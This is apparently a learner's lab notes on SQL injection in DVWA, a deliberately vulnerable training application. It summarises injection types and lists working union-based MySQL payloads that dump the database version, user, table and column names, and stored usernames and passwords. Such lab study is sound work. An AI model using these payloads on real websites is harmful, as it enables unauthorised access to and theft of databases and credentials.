# DVWA sql injection

Some basic things to know

**Error Based Injection**
- exploited through triggering errors in the database when invalid inputs are passed to it <br>[Error Based](https://sqlwiki.netspi.com/injectionTypes/errorBased/#mysql)

**Union-Based Injection**
- Allows an attacker to extract information from the database by extending the results returned by the original query <br>[Union-Based Injection](https://sqlwiki.netspi.com/injectionTypes/unionBased/#mysql)

**Blind Injection**
- Paritial blind
    - queries that return HTTP Status Codes, or other markers in the HTML response, that indicate true or false statements <br>[Partial-Blind/Full-Blind](https://sqlwiki.netspi.com/injectionTypes/blindBased/#mysql)
- Full blind
    - [Partial-Blind/Full-Blind](https://sqlwiki.netspi.com/injectionTypes/blindBased/#mysql)

## DVMA explained in 
> [DVWA SQL Injection Exploitation Explained (Step-by-Step)](https://www.golinuxcloud.com/dvwa-sql-injection/#Step_1_Setup_DVWA_for_SQL_Injection)

## DVMA solutions
> https://bughacking.com/dvwa-ultimate-guide-first-steps-and-walkthrough/#SQL_Injection_Blind

## Security low

### Using basic injection
    Id is get from the web site parameter
    By executing simple sql such as
    Select (database attributes) from (database table) where (param) = '(value)';

### Always true
    %' or '1'='1'
    %' or '0'='0'
    any thing that is always true

    The percent sign does not equal anything and will be false so it the second part will be ran '1'='1'

    This will return all the users inside the database

### Database version

Similar to alway true

    %' or 0=0 union select null, version() #
    This show which database version it is running on at the end

### Display db user
    %' or 0=0 union select null, user() #

## Display all tables
    %' or 0=0 union select null, table_name from information_schema.tables #

## Display all the user table
    %' or 0=0 union select null, table_name from information_schema.tables # where table_name like 'user%'#

## Display all the columns
    %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #

## Display column fields
    %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #

## sql injection in general
> [Examining the database in SQL injection attacks](https://portswigger.net/web-security/sql-injection/examining-the-database)

